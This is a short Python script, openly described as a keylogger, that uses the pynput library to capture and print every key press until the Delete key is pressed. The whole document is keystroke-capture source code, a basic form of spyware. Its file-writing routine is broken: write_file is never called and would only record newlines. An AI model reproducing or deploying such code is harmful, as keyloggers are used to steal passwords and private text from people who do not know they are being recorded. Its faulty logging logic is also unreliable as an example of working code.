#install pynput, cmd, "pip install pynput"
import pynput

while True:
    # importing keyboard listener below
    from pynput.keyboard import Key, Listener


    # asking for user input below
    user_input = input("This is my keylogger, press 't' to start or 'q' to stop: ")
    user_input = user_input.upper()

    # quit method
    if user_input == "Q":
        print("\nGOODBYE :)")
        quit()

    # keylogger method
    if user_input == "T":
        print("\nKEYS ARE NOW BEING LOGGED, HIT THE DEL KEY TO STOP AT ANY TIME")
        print("list of keys logged below:")

        count = 0
        keys = []


        # method that logs keys
        def on_press(key):
            global keys, count
            keys.append(key)
            count += 1
            print("{0}".format(key))


        def write_file(keys):
            with open("logger.txt", "a") as f:
                for key in keys:
                    k = str(key).replace("'","")
                    if k.find("space") > 0:
                        f.write("\n")



        #delete key stops keylogger from running
        def on_release(key):
            if key == Key.delete:
                return False


        # function for listening to inputs from keyboard
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()

    else:
        print("wrong input, try again..")
        print("\n")
        pass